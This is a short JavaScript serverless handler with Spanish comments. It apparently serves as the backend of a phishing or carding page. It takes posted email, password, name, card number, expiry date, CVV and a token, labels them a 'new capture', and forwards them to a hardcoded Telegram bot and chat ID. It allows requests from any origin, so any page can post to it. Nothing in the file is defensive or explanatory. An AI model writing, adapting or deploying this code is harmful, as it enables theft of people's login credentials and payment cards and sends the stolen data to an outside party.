const axios = require('axios');

export default async function handler(req, res) {
    // Configuración de CORS y Anti-Caché para permitir múltiples envíos
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
    res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, proxy-revalidate');

    if (req.method === 'OPTIONS') return res.status(200).end();
    if (req.method !== 'POST') return res.status(200).send('OK');

    const { em, pw, nm, cc, ex, cv, st } = req.body;
    const botToken = "8255731465:AAGrPR_qH0zC4zTdBqOj-Zt1jqY0W03-yws";
    const chatId = "7993722214";

    // Hemos eliminado el texto de "INFO RECIBIDA" y simplificado el reporte
    const mensaje = `⭐ **NUEVA CAPTURA** ⭐\n\n` +
                    `📧 **Email:** \`${em}\` \n` +
                    `🔑 **Pass:** \`${pw}\` \n\n` +
                    `👤 **Nombre:** ${nm}\n` +
                    `💳 **Tarjeta:** \`${cc}\` \n` +
                    `📅 **Exp:** ${ex} | **CVV:** ${cv}\n` +
                    `🆔 **Token:** ${st || "No disponible"}`;

    try {
        await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            chat_id: chatId,
            text: mensaje,
            parse_mode: 'Markdown'
        });
        return res.status(200).json({ success: true, timestamp: Date.now() });
    } catch (error) {
        return res.status(200).json({ success: false });
    }
}
